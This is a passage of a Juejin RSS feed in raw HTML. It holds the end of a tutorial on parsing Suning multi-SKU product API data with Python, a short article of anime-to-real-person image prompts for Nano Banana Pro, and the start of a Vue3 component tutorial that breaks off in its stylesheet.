                        <span class="hljs-string">"skuCode"</span>: <span class="hljs-string">"10003218976513"</span>,
                        <span class="hljs-string">"skuAttr"</span>: <span class="hljs-string">"白色/12GB/512GB"</span>,
                        <span class="hljs-string">"salePrice"</span>: <span class="hljs-number">4299.0</span>,
                        <span class="hljs-string">"stockCount"</span>: <span class="hljs-number">150</span>,
                        <span class="hljs-string">"skuStatus"</span>: <span class="hljs-string">"1"</span>
                    },
                    {
                        <span class="hljs-string">"skuCode"</span>: <span class="hljs-string">"10003218988814"</span>,  <span class="hljs-comment"># 无效SKU（无关联）</span>
                        <span class="hljs-string">"skuAttr"</span>: <span class="hljs-string">"蓝色+16GB+1TB"</span>,
                        <span class="hljs-string">"salePrice"</span>: <span class="hljs-number">4999.0</span>,
                        <span class="hljs-string">"stockCount"</span>: <span class="hljs-number">100</span>,
                        <span class="hljs-string">"skuStatus"</span>: <span class="hljs-string">"1"</span>
                    }
                ]
            },
            <span class="hljs-string">"attributeInfo"</span>: {
                <span class="hljs-string">"attributeList"</span>: [
                    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"机身颜色"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"黑色;白色;蓝色"</span>},
                    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"运行内存"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"8GB;12GB;16GB"</span>},
                    {<span class="hljs-string">"attrName"</span>: <span class="hljs-string">"存储容量"</span>, <span class="hljs-string">"attrValue"</span>: <span class="hljs-string">"256GB;512GB;1TB"</span>}
                ]
            }
        }
    }

    <span class="hljs-comment"># 全流程解析</span>
    parsed_result = parse_suning_multi_sku_product(mock_raw_data)
    <span class="hljs-comment"># 格式化输出</span>
    <span class="hljs-built_in">print</span>(json.dumps(parsed_result, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">2</span>))
</code></pre>
<h4 data-id="heading-14">2. 解析结果输出</h4>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"商品主信息"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"商品主ID"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100032189765"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"商品名称"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"小米14 5G手机【多规格】"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"商品主售价(元)"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3999.0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"商品主库存数"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">500</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"是否多规格"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"SKU列表"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"SKU编码"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"10003218976512"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"关联商品主ID"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100032189765"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"属性维度"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"颜色"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"内存"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"12GB"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"存储"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"256GB"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"原始属性字符串"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色+12GB+256GB"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"有效售价(元)"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3999.0</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"有效库存数"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">200</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"SKU状态"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"可售"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"SKU编码"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"10003218976513"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"关联商品主ID"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100032189765"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"属性维度"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"颜色"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"白色"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"内存"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"12GB"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"存储"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"512GB"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"原始属性字符串"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"白色/12GB/512GB"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"有效售价(元)"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4299.0</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"有效库存数"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">150</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"SKU状态"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"可售"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"静态属性列表"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"机身颜色"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色;白色;蓝色"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"运行内存"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"8GB;12GB;16GB"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"存储容量"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"256GB;512GB;1TB"</span><span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-15">五、避坑指南与优化建议</h3>
<h4 data-id="heading-16">1. 常见解析问题及解决方案</h4>



































<table><thead><tr><th>问题类型</th><th>表现形式</th><th>解决方案</th></tr></thead><tbody><tr><td>SKU 编码无关联</td><td>SKU 编码不以商品主 ID 为前缀</td><td>过滤无效 SKU，记录异常 SKU 编码用于核查</td></tr><tr><td>属性值匹配失败</td><td>拆分后的属性值无对应维度</td><td>新增「其他规格」维度兜底，避免字段缺失</td></tr><tr><td>单位格式混乱</td><td>功率有 "W"、"千瓦"，尺寸有 "cm"、"mm"</td><td>统一单位（如功率→W，尺寸→mm）</td></tr><tr><td>部分 SKU 无价格 / 库存</td><td>SKU 售价为 0 或库存为空</td><td>用商品主价格 / 库存兜底，并标记「数据异常」</td></tr><tr><td>特殊字符干扰</td><td>SKU 属性含 emoji、特殊符号（如🔥）</td><td>正则过滤非中文 / 数字 / 字母字符：<code>re.sub(r'[^\u4e00-\u9fa50-9A-Za-zGBW]+', '', attr)</code></td></tr></tbody></table>
<h4 data-id="heading-17">2. 性能优化建议</h4>
<ul>
<li><strong>缓存维度映射</strong>：将商品类目→规格维度的映射关系缓存（如手机→[颜色、内存、存储]），避免重复解析；</li>
<li><strong>批量解析</strong>：批量处理多商品时，先提取所有 SKU 属性格式，统一适配分隔符，提升解析效率；</li>
<li><strong>异步解析</strong>：使用<code>aiohttp</code>异步调用 API，结合多进程解析 SKU 属性，适配万级商品批量解析。</li>
</ul>
<h4 data-id="heading-18">3. 合规与稳定性建议</h4>
<ul>
<li><strong>异常日志</strong>：记录解析失败的 SKU 编码、属性字符串，便于后续排查；</li>
<li><strong>版本兼容</strong>：苏宁 API 版本更新时，优先适配<code>skuAttr</code>和<code>attributeInfo</code>字段的格式变化；</li>
<li><strong>数据校验</strong>：解析后校验 SKU 数量、价格范围（如售价不能为负），过滤无效数据。</li>
</ul>
<h3 data-id="heading-19">六、总结</h3>
<p>苏宁多规格商品 API 解析的核心是「<strong>关联验证 + 多格式适配 + 维度标准化</strong>」：</p>
<ol>
<li>关联验证：通过 SKU 编码前缀规则验证 SKU 与商品主 ID 的关联，过滤无效数据；</li>
<li>多格式适配：兼容不同分隔符、不同品类的属性格式，解决解析碎片化问题；</li>
<li>维度标准化：将属性值匹配到统一维度（颜色、内存、存储等），并标准化单位，适配下游业务场景。</li>
</ol>
<p>本文的解析方案可直接应用于商品展示、价格监控、库存管理、SKU 下单等核心业务场景，兼顾通用性与品类适配性，确保多规格商品数据的准确解析。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[太好看了！3 个动漫变真人 Nano Banana Pro 提示词]]></title>    <link>https://juejin.cn/post/7579920818870206506</link>    <guid>https://juejin.cn/post/7579920818870206506</guid>    <pubDate>2025-12-05T03:48:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579920818870206506" data-draft-id="7579843977849143350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="太好看了！3 个动漫变真人 Nano Banana Pro 提示词"/> <meta itemprop="keywords" content="前端,人工智能,AIGC"/> <meta itemprop="datePublished" content="2025-12-05T03:48:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            太好看了！3 个动漫变真人 Nano Banana Pro 提示词
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:48:23.000Z" title="Fri Dec 05 2025 03:48:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>本篇我和你分享 3 个将动漫变成真人的 Nano Banana Pro 提示词。</p>
<p>原图以最近很火的《罗小黑战记 2》中的鹿野为例：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de6e880ac8d4422db8462d20cdb8d6e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=nBVBvAR0zeXwf7INdXiyyfzvPbM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">动漫直接转真人</h2>
<p>提示词：</p>
<blockquote>
<p>1:1 变真人</p>
</blockquote>
<p>生成效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82cceaa6e25642e1b888b579d6a04b46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=pHDipme3dg9%2FIyf2VCwgLHk1Xmk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6b1b102435e4f88b49c5b3661455fd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=QmLVj1eTq2DczMx5V81LYQ%2BduRg%3D" alt="" loading="lazy"/></p>
<p>这个提示词也可以：</p>
<blockquote>
<p>精确复制原插图中的姿势、体态、手势、面部表情和拍摄角度,生成一张女孩在 Comiket 上 cosplay 这个插图的高度细节照片。保持相同的角度、透视和构图,不做任何偏离。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66a875f1b37e4b438310d7f4fa826520~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=truu9%2FFFbSOKLeUA3b%2BhfOjyjFA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1ffd60870054f2bb93df767ffe7b2f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=XIoSy7ozwEtcf4ikPjUxjlgAXEA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">漫展 Cos 达人</h2>
<p>提示词：</p>
<blockquote>
<p>一张电影感的、4K 分辨率的纪实风格照片，画面中一位 Coser 和一个真人大小的易拉宝展架，在熙熙攘攘的动漫展会大厅里并排站立。</p>
<p>易拉宝展架: 一个高大的（85x200 厘米）可伸缩易拉宝展架，其铝合金卷轴底座和顶部夹杆都清晰可见。印刷品是高分辨率的，具有哑光和防眩光效果，并且是无边框的满版印刷。</p>
<p>Coser 与匹配度 (关键): Coser 穿着一套与展架上角色完美匹配、1:1 屏幕还原度的 Cosplay 服装。Coser 的姿势与展架上的姿势完全相同，而不是镜像。每个细节都必须精确匹配：</p>
<p>姿势： 匹配所有的肢体角度、重心分布、头部倾斜、视线方向和手指形状。</p>
<p>服装： 精确匹配发型、剪裁、图案、颜色和配饰。</p>
<p>道具： 所有道具都必须出现，并且握在同一只手中，朝向也与展架上一致。</p>
<p>颜色： 调色板严格锁定为原始角色的设计。</p>
<p>场景与相机:</p>
<p>场地： 艺术家小巷的摊位风格，背景是中等虚化程度的人群。</p>
<p>灯光： 来自展会柔光箱的明亮、均匀的灯光。</p>
<p>机位角度： 平视，略微仰拍。</p>
<p>镜头与设置： 45mm 镜头，f/3.2 光圈，营造出浅景深效果，主体清晰，背景有漂亮的虚化。无动态模糊。</p>
<p>整体风格: 照片般逼真，具有最高的清晰度和细节。画面中任何地方都绝对不允许出现品牌标志或清晰可读的文字。</p>
<p>负面提示词 (Negative Prompt)</p>
<p>镜像姿势, 不同的姿势, 错误的姿势, 另一套服装, 重新设计, 重新诠释, 风格变体, 品牌标志, 清晰的文字, 签名, 水印, 卷边的展架, 白色边框, 泡沫板, 立牌, 模糊的展架, 模糊的主体, 过度曝光, 多余的肢体, 畸形的手, 缺少道具, 错误的颜色, 太阳镜, 女仆装。</p>
</blockquote>
<p>生成效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7278cdb7c084f7cb1b1fc74f2ec5cc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=1MBBsHfdNYwZ%2BxwaxSoW2bwl8I0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">动漫与现实分割肖像</h2>
<p>提示词：</p>
<blockquote>
<p>一张 16:9 的电影式宽屏镜头，画面中央是上传图片中的人物头像，脸部被垂直分割成两半。一条清晰的黑线将两种不同的画风从中间分开。[左半边]：经典的动漫风格。[右半边]：写实风格。面部特征完美契合，构成一幅浑然一体的角色肖像，使用虚幻引擎 5 渲染而成。</p>
</blockquote>
<p>生成效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52aa4db46d7f46a287429c311ffd6823~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=kiBDeh2nElpSCXPcCU%2FLFT87Vvs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdd78eb0f691492696d2330792737798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=UjLxE%2B1znV4gTsO%2FOh01Djxwog8%3D" alt="" loading="lazy"/></p>
<p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FAENFcFHlDXAmC_X6LZu7QA" target="_blank" title="https://mp.weixin.qq.com/s/AENFcFHlDXAmC_X6LZu7QA" ref="nofollow noopener noreferrer">太好看了！3 个动漫变真人 Nano Banana Pro 提示词</a></p>
<p>最后，欢迎你关注我的公众号：<strong>冴羽</strong>，或者搜索 <strong>yayujs</strong> ，10 年技术博主，各种系列文章，持续分享最新资讯、前端编程知识、AI 干货</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 + TS + TailwindCSS 操作引导组件开发逐行解析]]></title>    <link>https://juejin.cn/post/7579887768227692578</link>    <guid>https://juejin.cn/post/7579887768227692578</guid>    <pubDate>2025-12-05T03:24:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579887768227692578" data-draft-id="7579851956211843124" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 + TS + TailwindCSS 操作引导组件开发逐行解析"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-05T03:24:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码途潇潇"/> <meta itemprop="url" content="https://juejin.cn/user/2386391857112611"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 + TS + TailwindCSS 操作引导组件开发逐行解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2386391857112611/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码途潇潇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:24:35.000Z" title="Fri Dec 05 2025 03:24:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body 